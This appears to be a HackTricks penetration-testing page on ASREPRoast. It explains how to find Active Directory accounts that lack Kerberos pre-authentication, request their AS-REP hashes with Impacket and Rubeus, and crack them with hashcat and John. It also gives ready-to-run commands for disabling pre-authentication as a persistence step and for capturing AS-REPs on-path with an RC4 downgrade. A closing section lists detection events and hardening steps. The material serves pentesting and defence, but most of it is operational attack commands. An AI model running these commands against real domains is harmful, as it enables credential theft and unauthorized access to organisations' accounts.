# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast is a security attack that exploits users who lack the **Kerberos pre-authentication required attribute**. Essentially, this vulnerability allows attackers to request authentication for a user from the Domain Controller (DC) without needing the user's password. The DC then responds with a message encrypted with the user's password-derived key, which attackers can attempt to crack offline to discover the user's password.

The main requirements for this attack are:

- **Lack of Kerberos pre-authentication**: Target users must not have this security feature enabled.
- **Connection to the Domain Controller (DC)**: Attackers need network access to at least one DC in order to send requests and receive encrypted messages.
- **(Optional) Domain account**: Having a domain account allows attackers to enumerate vulnerable users through LDAP queries. Without such an account attackers must blindly guess usernames.

---

### Enumerating vulnerable users

#### From a domain-joined context (LDAP)

```powershell
# PowerView (Windows)
Get-DomainUser -PreauthNotRequired -Verbose
```

```bash
# bloodyAD (Linux)
bloodyAD -u user -p 'Passw0rd!' -d crash.lab --host 10.100.10.5 get search \
        --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' \
        --attr sAMAccountName
```

#### Without credentials (Kerbrute)

`kerbrute` supports a **--no-preauth** switch that detects accounts vulnerable to AS-REP Roasting through response analysis:

```bash
kerbrute userenum --no-preauth -d jurassic.park usernames.txt -o found.txt
```

> Kerbrute observes whether the DC returns KRB5KDC_ERR_PREAUTH_REQUIRED (account **requires** pre-auth) or a full AS-REP (account **does not require** pre-auth).

---

### Requesting the AS-REP message

```bash
# Linux / Impacket
# 1. Against a word-list of potential users (no creds required)
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast

# 2. Using domain credentials to pull only the vulnerable users
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```

```powershell
# Windows / Rubeus 2024+
# The /nowrap switch avoids line wraps, /aes will request AES tickets if the account supports them
Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username] [/aes] [/nowrap]

# Legacy PowerShell implementation
Get-ASREPHash -Username VPN114user -Verbose   # (ASREPRoast.ps1)
```

> [!WARNING]
> AS-REP Roasting with Rubeus generates event **4768** (Ticket-Granting-Ticket requested) with **Pre-authentication Type = 0** and **Encryption Type 0x17 / 0x11 / 0x12** depending on the cipher negotiated.

---

### Cracking the hash

#### RC4-HMAC (etype 23 – most common)

```bash
hashcat -m 18200 hashes.asreproast wordlist.txt
john --wordlist=wordlist.txt hashes.asreproast
```

#### AES (etype 17 / 18 – Windows Server 2019 defaults)

Since 2023, Hashcat includes native modules for AES-encrypted AS-REPs (32100 & 32200):

```bash
# AES-128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 32100 hashes.asreproast wordlist.txt

# AES-256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 32200 hashes.asreproast wordlist.txt
```

John the Ripper already supports these formats:

```bash
john --format=krb5pa-sha1 hashes.asreproast --wordlist=wordlist.txt
```

> AES tickets are **significantly** harder to brute-force than RC4; cracking feasibility now almost entirely depends on password strength.

---

### Persistence / Weaponisation

If you control an account (e.g. via GenericAll) you can **remove** pre-authentication to expose it to future roasting attempts:

```powershell
# Windows (PowerView)
Set-DomainObject -Identity <username> -XOR @{userAccountControl = 4194304} -Verbose
```

```bash
# Linux (bloodyAD)
bloodyAD -u user -p 'Passw0rd!' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH target_user
```

---

## Detection & Mitigation

| What to look for | How |
|------------------|-----|
| Kerberos TGT requests **without** pre-authentication | Windows Security **Event ID 4768** where **Pre-Authentication Type = 0** |
| Unusual encryption downgrades to **RC4 (0x17)** | Correlate Event ID 4768/4769 where *Ticket Encryption Type = 0x17* |
| LDAP enumeration of `DONT_REQ_PREAUTH` accounts | Monitor directory-service logs for filters containing `4194304` |

Alerting rules such as the Sigma rule `windows_kerberos_asrep_roast` implement this logic and are natively supported by most SIEM/SOAR platforms .

Hardening recommendations:

1. **Enforce pre-authentication** for *all* accounts:  
   `Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} | Set-ADUser -DoesNotRequirePreAuth $false`
2. **Disable RC4 encryption** and require AES-only Kerberos where legacy compatibility permits.
3. Apply **long, random service-account passwords** (ideally 25+ characters) or switch to **Group Managed Service Accounts (gMSA)**.
4. Monitor Event ID 4738/5136 for changes to the `userAccountControl` flag.

---

## AS-REP Roasting without credentials (on-path)

An attacker with a **man-in-the-middle** position can capture AS-REP packets for *any* user and optionally force weak ciphers.  [ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) automates this:

```bash
# Actively proxy and RC4-downgrade Kerberos traffic
ASRepCatcher relay --dc $DC_IP

# Passive listening (no packet alteration)
ASRepCatcher listen
```

---

## References

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [https://github.com/hashcat/hashcat/blob/master/src/modules/module_32200.c](https://github.com/hashcat/hashcat/blob/master/src/modules/module_32200.c) 
- [https://www.blumira.com/blog/how-to-detect-as-rep-roasting](https://www.blumira.com/blog/how-to-detect-as-rep-roasting) 

---

{{#include ../../banners/hacktricks-training.md}}
